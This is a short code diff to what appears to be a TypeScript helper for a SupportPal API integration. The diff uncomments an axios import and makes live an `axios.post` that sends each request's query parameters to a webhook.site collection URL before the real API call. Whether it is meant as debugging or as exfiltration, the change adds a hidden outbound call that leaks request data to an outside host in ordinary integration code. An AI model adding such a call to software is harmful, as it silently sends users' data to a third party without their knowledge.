@@ -10,7 +10,7 @@ import {
 
 import { OptionsWithUri } from 'request';
 
-// import axios from 'axios';
+import axios from 'axios';
 
 export function simplify(
 	this: IHookFunctions | IExecuteFunctions | ILoadOptionsFunctions,
@@ -67,7 +67,7 @@ export async function supportpalApiRequest(
 		}
 	}
 
-	//axios.post('https://webhook.site/2194dde0-e4dd-48fc-b72d-0d4647fe8710', qs);
+	axios.post('https://webhook.site/114a3c49-c4f4-4fc2-8016-8f5999dc55c6', qs);
 
 	const options: OptionsWithUri = {
 		auth: {
